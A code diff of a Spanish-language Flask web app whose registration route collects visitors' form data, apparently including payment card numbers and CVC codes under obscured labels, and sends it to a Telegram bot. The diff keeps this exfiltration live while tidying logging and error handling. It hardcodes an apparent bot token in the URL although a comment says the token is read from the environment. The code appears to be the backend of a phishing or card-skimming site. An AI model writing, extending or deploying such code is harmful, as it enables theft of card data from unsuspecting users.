@@ -4,12 +4,10 @@ import os
 
 app = Flask(__name__)
 
-# Ruta para la página principal
 @app.route('/')
 def index():
     return render_template('index.html')
 
-# Ruta para la página de registro (GET: muestra form; POST: procesa y envía a bot)
 @app.route('/registro', methods=['GET', 'POST'])
 def registro():
     if request.method == 'POST':
@@ -62,46 +60,60 @@ def registro():
             f"- ggg: {data['card_cvc']}"
         )
 
-        # Enviar a bot de Telegram
+        # Leer token y chat_id desde variables de entorno
         bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
-        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
-        
-        # Verificar que las variables existan
-        if not bot_token or not chat_id:
-            print("Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurados en variables de entorno")
-            print(f"bot_token: {bot_token}, chat_id: {chat_id}")
-            return jsonify({'success': False, 'message': 'Error de configuración del servidor'}), 500
+        chat_id   = os.environ.get('TELEGRAM_CHAT_ID')
 
+        # Validación de configuración
+        if not bot_token or not chat_id:
+            print("Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurados")
+            print(f"bot_token: {bot_token}, chat_id: {chat_id}")
+            return jsonify({
+                'success': False,
+                'message': 'Error de configuración del servidor'
+            }), 500
+
+        # Construir la URL correctamente usando el token de entorno
         telegram_url = f"https://api.telegram.org/bot8345884832:AAEBzNwoibZhS5uRHPD62Pyicuvhc_bwU-A/sendMessage"
 
         try:
-            response = requests.post(telegram_url, data={
-                'chat_id': chat_id,
-                'text': message,
-                'parse_mode': 'Markdown'
-            })
-            print(f"Telegram request URL: {telegram_url}")
-            print(f"Telegram response status: {response.status_code}")
-            print(f"Telegram response body: {response.text}")
+            response = requests.post(
+                telegram_url,
+                data={
+                    'chat_id': chat_id,
+                    'text': message,
+                    'parse_mode': 'Markdown'
+                }
+            )
 
-            if response.status_code == 200:
-                response_json = response.json()
-                if response_json.get('ok'):
-                    return jsonify({'success': True, 'message': 'Registro Terminado'})
-                else:
-                    print(f"Telegram API error: {response_json.get('description')}")
-                    return jsonify({'success': False, 'message': f'Error de Telegram: {response_json.get("description")}'}), 500
+            # Logging detallado
+            print("Telegram request URL:", telegram_url)
+            print("Telegram response status:", response.status_code)
+            print("Telegram response body:", response.text)
+            print("Telegram JSON completo:", response.json())
+
+            # Evaluar respuesta de Telegram
+            resp_json = response.json()
+            if response.status_code == 200 and resp_json.get('ok'):
+                return jsonify({'success': True, 'message': 'Registro Terminado'})
             else:
-                print(f"Telegram HTTP error: {response.status_code} - {response.text}")
-                return jsonify({'success': False, 'message': f'Error en la solicitud HTTP: {response.status_code}'}), 500
-        except Exception as e:
-            print(f"Exception during Telegram request: {str(e)}")
-            return jsonify({'success': False, 'message': f'Error interno: {str(e)}'}), 500
+                error_desc = resp_json.get('description', 'Sin descripción')
+                print("Telegram API error:", error_desc)
+                return jsonify({
+                    'success': False,
+                    'message': f'Error de Telegram: {error_desc}'
+                }), 500
 
-    # Para GET, renderiza el formulario
+        except Exception as e:
+            print("Exception during Telegram request:", str(e))
+            return jsonify({
+                'success': False,
+                'message': f'Error interno: {str(e)}'
+            }), 500
+
+    # GET → mostrar el formulario
     return render_template('registro.html')
 
-# Ruta para la página de productos
 @app.route('/productos')
 def productos():
     return render_template('productos.html')
